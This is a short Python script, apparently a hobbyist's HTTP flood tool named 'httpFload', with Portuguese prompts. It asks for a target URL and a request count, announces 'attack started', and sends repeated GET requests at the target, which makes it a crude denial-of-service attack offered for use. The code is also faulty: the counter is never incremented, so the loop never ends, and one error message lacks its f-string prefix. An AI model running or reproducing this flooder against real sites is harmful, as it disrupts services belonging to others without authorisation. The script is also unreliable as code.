# s
import requests
import os

os.system("clear")
os.system("figlet httpFload")
print("by voidh7")
url = input("qual a url do alvo:")


rangeReqs = int(input("quantas requisiçãoes deseja fazer:"))

contador = 0
print("ataque iniciado")

while contador < rangeReqs:
    contador +1

    response = requests.get(url)
    if(response.status_code == 200):
      print("requisiçao feita com sucesso")
      print(response.text)
    else:
        print("erro status code {response.status_code}") 
